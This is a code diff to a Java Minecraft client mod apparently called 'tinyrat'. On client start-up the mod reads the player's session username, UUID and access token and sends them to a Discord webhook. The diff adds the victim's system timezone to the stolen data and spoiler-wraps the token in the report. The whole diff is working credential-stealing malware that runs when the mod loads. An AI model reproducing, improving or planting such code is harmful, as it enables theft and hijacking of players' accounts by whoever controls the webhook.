@@ -8,7 +8,11 @@ import com.github.tinyrat.utils.ConfigLoader;
 import com.github.tinyrat.utils.DiscordEmbed;
 import com.github.tinyrat.utils.DiscordWebhook;
 
+import java.time.ZoneId;
+
 public class Entry implements ClientModInitializer {
+    public static final String MOD_ID = "tinyrat";
+
     @Override
     public void onInitializeClient() {
         MinecraftClient minecraft = MinecraftClient.getInstance();
@@ -22,9 +26,17 @@ public class Entry implements ClientModInitializer {
         DiscordWebhook webhook = new DiscordWebhook(webhookUrl);
 
         DiscordEmbed embed = new DiscordEmbed("Session found");
-        embed.add("Username: [" + session.getUsername() + "](https://namemc.com/profile/" + session.getUuidOrNull() +")");
-        embed.add("Session token:\n```" + session.getAccessToken() + "```");
+
+        String currentTimezone = this.getTimezone();
+
+        embed.addln("**Username**: [" + session.getUsername() + "](https://namemc.com/profile/" + session.getUuidOrNull() +")");
+        embed.addln("**Timezone:** `" + currentTimezone + "`\n");
+        embed.addln("**Session token**:\n||```" + session.getAccessToken() + "```||");
 
         webhook.sendEmbed(embed);
+    }
+
+    private String getTimezone() {
+        return java.time.ZoneId.systemDefault().toString();
     }
 }
